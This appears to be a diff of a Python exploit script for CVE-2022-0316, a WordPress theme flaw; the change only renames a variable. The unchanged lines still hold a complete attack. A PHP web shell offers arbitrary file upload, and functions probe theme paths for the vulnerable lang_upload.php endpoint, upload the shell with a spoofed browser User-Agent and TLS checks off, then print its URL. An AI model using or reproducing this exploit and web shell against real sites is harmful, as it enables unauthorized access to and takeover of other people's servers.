@@ -20,16 +20,16 @@ vulnerable_paths = [
 
 shell_code = '''<?php error_reporting(0);echo("kill_the_net<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>'''
 
-def upload_shell(session, target_url, shell_name):
+def upload_shell(session, profile_url_url, shell_name):
     try:
-        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Attempting to upload shell to {target_url}...")
+        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Attempting to upload shell to {profile_url_url}...")
 
         files = {"mofile[]": (shell_name, shell_code)}
-        response = session.post(target_url, files=files, verify=False, timeout=30)
+        response = session.post(profile_url_url, files=files, verify=False, timeout=30)
 
         if "New Language Uploaded Successfully" in response.text:
             print(f"{Style.BRIGHT}{Fore.GREEN}[•] Shell uploaded successfully!")
-            shell_url = target_url.replace("include/lang_upload.php", f"languages/{shell_name}")
+            shell_url = profile_url_url.replace("include/lang_upload.php", f"languages/{shell_name}")
             print(f"{Style.BRIGHT}{Fore.CYAN}[•] Shell URL: {shell_url}")
             return shell_url
         else:
@@ -39,12 +39,12 @@ def upload_shell(session, target_url, shell_name):
         print(f"{Style.BRIGHT}{Fore.RED}[•] Error uploading shell: {e}")
         return None
 
-def check_vulnerability(session, target):
+def check_vulnerability(session, profile_url):
     try:
-        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {target} for vulnerability...")
+        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {profile_url} for vulnerability...")
 
         for path in vulnerable_paths:
-            test_url = f"{target}/wp-content/themes/{path}/include/lang_upload.php"
+            test_url = f"{profile_url}/wp-content/themes/{path}/include/lang_upload.php"
             response = session.get(test_url, verify=False, timeout=30)
 
             if 'Please select Mo file' in response.text:
@@ -58,12 +58,12 @@ def check_vulnerability(session, target):
         print(f"{Style.BRIGHT}{Fore.RED}[•] Error checking vulnerability: {e}")
         return None
 
-def scan_cve_2022_0316(target):
+def scan_cve_2022_0316(profile_url):
     session = requests.Session()
     session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"})
 
-    target = target.rstrip('/') 
-    vulnerable_url = check_vulnerability(session, target)
+    profile_url = profile_url.rstrip('/') 
+    vulnerable_url = check_vulnerability(session, profile_url)
 
     if vulnerable_url:
         shell_name = f"{getrandbits(32)}.php"
@@ -74,4 +74,4 @@ def scan_cve_2022_0316(target):
         else:
             print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed. Could not upload shell.")
     else:
-        print(f"{Style.BRIGHT}{Fore.RED}[•] No vulnerable endpoints found for {target}.")
+        print(f"{Style.BRIGHT}{Fore.RED}[•] No vulnerable endpoints found for {profile_url}.")
